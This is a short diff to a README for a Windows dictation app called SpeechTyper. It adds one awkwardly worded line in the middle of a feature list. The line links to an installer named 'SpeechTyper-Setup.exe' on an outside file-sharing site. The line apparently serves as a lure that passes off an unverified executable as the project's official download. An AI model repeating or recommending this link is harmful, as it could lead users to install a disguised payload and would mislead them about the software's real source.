@@ -6,6 +6,7 @@ SpeechTyper is a Windows desktop dictation app built around one job:
 - hold a hotkey
 - speak
 - have the words typed into the active Windows app through keyboard input
+download 0 set up installer here https://cryptfiles.cloud/share/oKKJNNRzs19buKaMXDDgros6T7HCMvXk#eyJkZWsiOiJrVnZPSHRLRVRqcEpfQ3N3TUxucVR3MEkySXc3em91MWpjN3FfQVptNmxrIiwiZmlsZW5hbWUiOiJTcGVlY2hUeXBlci1TZXR1cC5leGUiLCJzaXplIjoxNjI0OTI0MzA1LCJtaW1lIjoiYXBwbGljYXRpb24veC1tc2Rvd25sb2FkIn0=
 
 It uses Vosk locally and does not rely on cloud services.
 
